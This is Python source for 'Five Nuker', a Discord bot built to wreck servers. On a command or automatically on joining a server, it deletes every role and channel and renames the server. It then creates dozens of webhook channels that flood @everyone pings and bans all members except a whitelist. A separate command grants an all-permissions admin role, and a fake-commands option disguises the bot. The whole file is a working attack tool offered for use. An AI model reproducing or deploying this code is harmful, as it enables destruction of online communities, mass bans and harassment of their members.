from discord import Intents, Permissions
from discord.ext import commands
import discord
from asyncio import create_task 
from pathlib import Path
import configparser
import colorama
from colorama import Fore
import os
import fade
from time import sleep

config = configparser.ConfigParser()

colorama.init(autoreset=True)

def clear():
    if os.name=='nt':
        os.system('cls')
    else:
        os.system('clear')

os.system('taskkill /f /im launcher.exe')
clear()
nversion = open('Bin\\curent_version.fnv', 'rb')
nversion = nversion.read().decode('utf-8')
os.system("title Five Nuker - v" + nversion + " - Made By G1itch")

ptfc = 'Configs\\main_cfg.ini'
pti = 'Bin\\icon.PNG'
cfg = Path(ptfc)
ic = Path(pti)
cl = Path('Configs\\list_of_fake_commands.txt')
cr = Path('Configs\\nuker_reactions_to_fake_commands.txt')

ptwlp = Path('Configs\\whitelisted_people.txt')

if not ptwlp.is_file():
    with open(ptwlp, 'w+') as tmpf:
        tmpf.write('user1#1234\nuser2#4321\ng11itch#0')
        tmpf.close()

 


with open(ptwlp, 'r') as list_of_wlp:
    whitelisted_ppls = list_of_wlp.read().splitlines()


if not cl.is_file():
    cnf = open('Configs\\list_of_fake_commands.txt','w+')
    cnf.close()

if not cr.is_file():
    cnf = open('Configs\\nuker_reactions_to_fake_commands.txt','w+')
    cnf.close()


if cfg.is_file():
    print(f'{Fore.YELLOW}[Config System]' + '\033[39m' + ' Config founded!')
    config.read('Configs\\main_cfg.ini')
    print(f'{Fore.CYAN}[BOT]' + '\033[39m' + 'Starting...')
else:
    print(f'{Fore.RED}[ERROR]' + '\033[39m' + 'Config not found! Creating new config...')
    config['BOT_CFG'] = {'prefix': '!',
                         'token': 'bot token here',
                         'spamtext': '@everyone @here \nImagine get nuked by Five bot \nhttps://github.com/glitch65/Discord-Five-nuker-bot \nXD',
                         'ac_name': 'five nuker on top',
                         'ac_type': '1',
                         'silent_mode': '0',
                         'channels and roles name': 'nuked by five nuker',
                         'webhooks name': 'five nuker',
                         'server name':'nuked by five nuker',
                         'ban reason': 'XDDDD',
                         'how much pings per channel do you want?': '60',
                         'how much channels do you want?': '35', 
                         'how much roles do you want?': '40',
                         'admin role name': 'sh...',
                         'ban people while i nuking the server?': '1'}
    config['Nuker mode'] = {'Mode': '1'}
    config['Fake commands'] = {'Enabled?': '0'}
    with open('Configs\\main_cfg.ini', 'w') as cfg_file:
            config.write(cfg_file)
    print(f'{Fore.YELLOW}[Config System]' + '\033[39m' + 'Done!')
    print(f'{Fore.YELLOW}[Config System]' + '\033[39m' + 'Edit config file in youre folder and try again')
    input('Press Enter to close program...')
    exit()

clear()

with open('Bin\\icon.PNG', 'rb') as f:
    icona = f.read()

prefix = config['BOT_CFG']['prefix'] 
token = config['BOT_CFG']['token'] 
spamtext = config['BOT_CFG']['spamtext'] 
ac_name = config['BOT_CFG']['ac_name']
ac_type = int(config['BOT_CFG']['ac_type']) 
silent_mode = int(config['BOT_CFG']['silent_mode'] )
chnrln = config['BOT_CFG']['channels and roles name']
wbn = config['BOT_CFG']['webhooks name']
srvn = config['BOT_CFG']['server name']
br = config['BOT_CFG']['ban reason']
howmp = int(config['BOT_CFG']['how much pings per channel do you want?'])
howmc = int(config['BOT_CFG']['how much channels do you want?'])
howmr = int(config['BOT_CFG']['how much roles do you want?'])
adrn = config['BOT_CFG']['admin role name']
nuker_mode = str(config['Nuker mode']['Mode'])
ban_people = str(config['BOT_CFG']['ban people while i nuking the server?'])
is_fake_commands_enabled = str(config['Fake commands']['Enabled?'])




intents = Intents.default()
intents.members = True
client = commands.Bot(command_prefix=prefix, help_command=None, intents=intents.all())



bot_started_text = f'{Fore.MAGENTA}Bot launched successfully!'


def login():
    try: client.run(token)
    except: print(f'{Fore.RED}[ERROR]' + '\033[39m' + 'Invalid token please change token and try again.')
    input('Press Enter to exit...')
    quit()

async def rmm():
    clear()
    mm()
    print(bot_started_text.center(115))
    print(f'{Fore.MAGENTA}Logged in as {Fore.GREEN}{client.user}!'.center(120))
    
list_of_fake_commands = open('Configs\\list_of_fake_commands.txt', 'r')
list_of_fake_commands = list_of_fake_commands.readlines()
response_to_fake_commands = open('Configs\\nuker_reactions_to_fake_commands.txt', 'r')
response_to_fake_commands = response_to_fake_commands.readlines()

@client.event
async def on_message(m):
    if m.content.startswith(prefix) and is_fake_commands_enabled == '1':
        for i, line in enumerate(list_of_fake_commands):
            new_m_content = m.content.replace(prefix, '')
            if new_m_content in line:
                await m.channel.send(response_to_fake_commands[i])
            else:
                await client.process_commands(m)
    else:
        await client.process_commands(m)

@client.event
async def on_command_error(ctx,error):
    sleep(1)

@client.event
async def on_ready():
    if ac_type == 1 and silent_mode == 0:
        await client.change_presence(activity=discord.Game(name=ac_name))
    elif ac_type == 2 and silent_mode == 0:
        await client.change_presence(activity=discord.Activity(type=discord.ActivityType.listening, name=ac_name))
    elif ac_type == 3 and silent_mode == 0:
        await client.change_presence(activity=discord.Streaming(name=ac_name, url='https://www.twitch.tv/discord'))
    elif ac_type == 4 and silent_mode == 0:
        await client.change_presence(activity=discord.Activity(type=discord.ActivityType.watching, name=ac_name))
    elif silent_mode == 1:
        await client.change_presence(status=discord.Status.offline)
    await rmm()



@client.event
async def on_guild_join(ctx):
    if nuker_mode == '2':
        await ctx.edit(name=srvn, icon=icona)
        for rl in ctx.roles:
            create_task(killobject(obj=rl))
        for channel in ctx.channels:
            create_task(killobject(obj=channel))
        if ban_people == '1':    
            create_task(banallmode2(ctx=ctx))
        for _ in range(howmr):
            create_task(createrole2(ctx))
        for _ in range(howmc):    
            create_task(createchannel2(ctx,name=chnrln))

async def killobject(obj):
    try: await obj.delete()
    except: pass

async def sendch(ctx,channel: discord.TextChannel,count):
    for _ in range(count):
        try: await channel.send(spamtext)
        except: pass

async def createchannel(ctx,name):
    try:
        chan = await ctx.guild.create_text_channel(name=name)
        wb = await chan.create_webhook(name=wbn,avatar=icona)
        create_task(sendch(ctx,wb,count=howmp))
    except: pass

async def createchannel2(ctx,name):
    try:
        chan = await ctx.create_text_channel(name=name)
        wb = await chan.create_webhook(name=wbn,avatar=icona)
        create_task(sendch(ctx,wb,count=howmp))
    except: pass

async def createrole(ctx):
    try: await ctx.guild.create_role(name=chnrln)
    except: pass

async def createrole2(ctx):
    try: await ctx.create_role(name=chnrln)
    except: pass

@client.command()
async def start(ctx):
    if nuker_mode == '1':
        await ctx.message.delete()
        await ctx.guild.edit(name=srvn, icon=icona)
        for rl in ctx.guild.roles:
            create_task(killobject(obj=rl))
        for channel in ctx.guild.channels:
            create_task(killobject(obj=channel))
        if ban_people == '1':
            create_task(bananaa(ctx=ctx))
        for _ in range(howmr):
            create_task(createrole(ctx))
        for _ in range(howmc):    
            create_task(createchannel(ctx,name=chnrln))


@client.command()
async def admin(ctx,target):
    await ctx.message.delete()
    r =  await ctx.guild.create_role(name=adrn,permissions=Permissions.all())
    if target == 'all':
        for membe in list(ctx.guild.members):
            await membe.add_roles(r)
    elif target == 'me':
        await ctx.message.author.add_roles(r)
            



async def bananaa(ctx):
    all_members_list = list(ctx.guild.members)
    all_members_list.remove(ctx.message.author)
    for nfwl in whitelisted_ppls:
        fwl = ctx.guild.get_member_named(nfwl)
        try:    
            all_members_list.remove(fwl)
        except:
            pass
    for not_wl_ppl in all_members_list:
        try:
            await not_wl_ppl.ban(reason=br, delete_message_days=7)
        except:
            pass





async def banallmode2(ctx):
    all_members_list = list(ctx.members)
    for nfwl in whitelisted_ppls:
        fwl = ctx.get_member_named(nfwl)
        print(fwl)
        try:    
            all_members_list.remove(fwl)
        except:
            pass
    for not_wl_ppl in all_members_list:
        try:
            await not_wl_ppl.ban(reason=br, delete_message_days=7)
        except:
            pass

raw_nuker_logo = '''
                     █████▒ ██▓ ██▒   █▓▓█████     ███▄    █  █    ██  ██ ▄█▀▓█████  ██▀███  
                   ▓██   ▒ ▓██▒▓██░   █▒▓█   ▀     ██ ▀█   █  ██  ▓██▒ ██▄█▒ ▓█   ▀ ▓██ ▒ ██▒
                   ▒████ ░ ▒██▒ ▓██  █▒░▒███      ▓██  ▀█ ██▒▓██  ▒██░▓███▄░ ▒███   ▓██ ░▄█ ▒
                   ░▓█▒  ░ ░██░  ▒██ █░░▒▓█  ▄    ▓██▒  ▐▌██▒▓▓█  ░██░▓██ █▄ ▒▓█  ▄ ▒██▀▀█▄  
                   ░▒█░    ░██░   ▒▀█░  ░▒████▒   ▒██░   ▓██░▒▒█████▓ ▒██▒ █▄░▒████▒░██▓ ▒██▒
                    ▒ ░    ░▓     ░ ▐░  ░░ ▒░ ░   ░ ▒░   ▒ ▒ ░▒▓▒ ▒ ▒ ▒ ▒▒ ▓▒░░ ▒░ ░░ ▒▓ ░▒▓░
                    ░       ▒ ░   ░ ░░   ░ ░  ░   ░ ░░   ░ ▒░░░▒░ ░ ░ ░ ░▒ ▒░ ░ ░  ░  ░▒ ░ ▒░
                    ░ ░     ▒ ░     ░░     ░         ░   ░ ░  ░░░ ░ ░ ░ ░░ ░    ░     ░░   ░ 
                            ░        ░     ░  ░            ░    ░     ░  ░      ░  ░   ░     
                            ░                                                        



'''
if nuker_mode == '1':
    nm = 'nuke on command'
else:
    nm = 'nuke on join'

info_about_nuker = f'{Fore.MAGENTA}Curent version: {Fore.LIGHTGREEN_EX}v{nversion} {Fore.MAGENTA}     Prefix: {prefix}    Mode:{Fore.LIGHTGREEN_EX} {nm}'

empty_space = '''




'''

def mm():
    nuker_logo = fade.purplepink(raw_nuker_logo)
    print(nuker_logo)
    print(info_about_nuker.center(125))
    print(empty_space)


mm()

welcome_text = f'{Fore.MAGENTA}Welcome to Five Nuker press enter to start nuker...'

input(welcome_text.center(120) + f'{Fore.RESET}')
login()